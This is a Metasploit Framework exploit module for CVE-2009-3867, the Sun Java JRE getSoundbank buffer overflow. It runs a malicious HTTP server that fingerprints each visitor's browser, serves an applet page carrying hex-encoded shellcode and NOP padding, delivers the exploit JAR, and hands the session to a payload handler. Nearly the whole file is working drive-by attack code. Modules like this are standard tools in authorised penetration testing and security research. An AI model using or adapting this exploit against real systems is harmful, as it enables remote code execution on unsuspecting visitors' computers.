##
# $Id: java_getsoundbank_bof.rb 7827 2009-12-11 21:18:31Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	#
	# This module acts as an HTTP server
	#
	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Sun Java JRE getSoundbank file:// URI Buffer Overflow',
			'Description'    => %q{
				This module exploits a flaw in the getSoundbank function in the Sun JVM.
				
				The payload is serialized and passed to the applet via PARAM tags. It must be
				a native payload.
				
				The effected Java versions are JDK and JRE 6 Update 16 and earlier, 
				JDK and JRE 5.0 Update 21 and earlier, SDK and JRE 1.4.2_23 and 
				earlier, and SDK and JRE 1.3.1_26 and earlier.
				
				NOTE: Although all of the above versions are reportedly vulnerable, only
				1.6.0_u11 and 1.6.0_u16 on Windows XP SP3 were tested.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>  
				[
					'kf',      # Original PoC/exploit
					'jduck'    # metasploit version
				],
			'Version'        => '$Revision: 7827 $',
			'References'     => 
				[
					[ 'CVE', '2009-3867' ],
					[ 'OSVDB', '59711' ],
	  				[ 'BID', '36881' ],
					[ 'URL', 'http://zerodayinitiative.com/advisories/ZDI-09-076/' ]
				],
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => '',
					'DisableNops' => true,
				},
			'Targets'        =>
				[
					[ 'J2SE 1.6_16 Automatic', 
						{
							'Platform' => ['win', 'linux', 'osx'],
							'Arch' => [ARCH_X86, ARCH_PPC]
						}
					],
					[ 'J2SE 1.6_16 on Windows x86', 
						{
							'Platform' => 'win',
							'Arch' => ARCH_X86
						}
					],
					[ 'J2SE 1.6_16 on Mac OS X PPC', 
						{
							'Platform' => 'osx',
							'Arch' => ARCH_PPC,
						}
					],
					[ 'J2SE 1.6_16 on Mac OS X x86', 
						{
							'Platform' => 'osx',
							'Arch' => ARCH_X86,
						}
					],
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Nov 04 2009'
			))
	end
	
	
	def on_request_uri(cli, req)
		
		# Create a cached mapping between IP and detected target
		@targetcache ||= {}
		@targetcache[cli.peerhost] ||= {}
		@targetcache[cli.peerhost][:update] = Time.now.to_i

		if (target.name =~ /Automatic/) 
			case req.headers['User-Agent']
			when /Windows/i
				print_status("Choosing a Windows target for #{cli.peerhost}:#{cli.peerport}...")
				@targetcache[cli.peerhost][:target] = self.targets[1]
			when /PPC Mac OS X/i
				print_status("Choosing a Mac OS X PPC target for #{cli.peerhost}:#{cli.peerport}...")
				@targetcache[cli.peerhost][:target] = self.targets[2]			
			when /Intel Mac OS X/i
				print_status("Choosing a Mac OS X x86 target for #{cli.peerhost}:#{cli.peerport}...")
				@targetcache[cli.peerhost][:target] = self.targets[3]
			else
				print_status("Unknown target for: #{req.headers['User-Agent']}")
			end
		end

		# Clean the cache 
		rmq = []
		@targetcache.each_key do |addr|
			if (Time.now.to_i > @targetcache[addr][:update]+60)
				rmq.push addr
			end
		end
				
		rmq.each {|addr| @targetcache.delete(addr) }
	
	
		# Request processing
		if (not req.uri.match(/\.jar$/i))
		
			# Redirect to the base directory so the applet code loads...
			if (not req.uri.match(/\/$/))
				print_status("Sending redirect so path ends with / ...")
				send_redirect(cli, get_resource() + '/', '')
				return
			end
		
			# Display the applet loading HTML
			print_status("Sending HTML to #{cli.peerhost}:#{cli.peerport}...")
			send_response_html(cli, generate_html(payload.encoded),
				{
					'Content-Type' => 'text/html',
					'Pragma' => 'no-cache'
				})
			return
		end
		
		# Send the actual applet over
		print_status("Sending applet to #{cli.peerhost}:#{cli.peerport}...")
		send_response(cli, generate_applet(cli, req), 
			{
				'Content-Type' => 'application/octet-stream',
				'Pragma' => 'no-cache'
			})

		# Handle the payload
		handler(cli)
	end


	def generate_html(pl)

		html = %Q|<html>
 <head>
  <!-- <meta http-equiv=refresh content=10 /> -->
 </head>
 <body>
  <applet width='100%' height='100%' code='AppletX' archive='CVE-2009-3867.jar'5>
   <param name='sc' value='SCODE' />
   <param name='np' value='NOPS' />
  </applet>
 </body>
</html>
|
		# ugh.. pain
		debug_payload = false
		pload = ""
		pload << "\xcc" if debug_payload
		pload << pl
		if ((pload.length % 4) > 0)
			pload << rand_text((4 - (pload.length % 4)))
		end
		if debug_payload
			print_status("pload #{pload.length} bytes:\n" + Rex::Text.to_hex_dump(pload))
		end
		html.gsub!(/SCODE/, Rex::Text.to_hex(pload, ''))
		
		nops = "\x90\x90\x90\x90"
		html.gsub!(/NOPS/, Rex::Text.to_hex(nops, ''))
		#print_status("nops #{nops.length} bytes:\n" + Rex::Text.to_hex_dump(nops))
		
		return html

	end


	def generate_applet(cli, req)

		this_target = nil
		if (target.name =~ /Automatic/) 
			if (@targetcache[cli.peerhost][:target])
				this_target = @targetcache[cli.peerhost][:target]
			else
				return ''
			end
		else
			this_target = target
		end

		path = File.join(Msf::Config.install_root, "data", "exploits", "CVE-2009-3867.jar")

		fd = File.open(path, "rb")
		data = fd.read
		fd.close
		
		return data
	end	

end

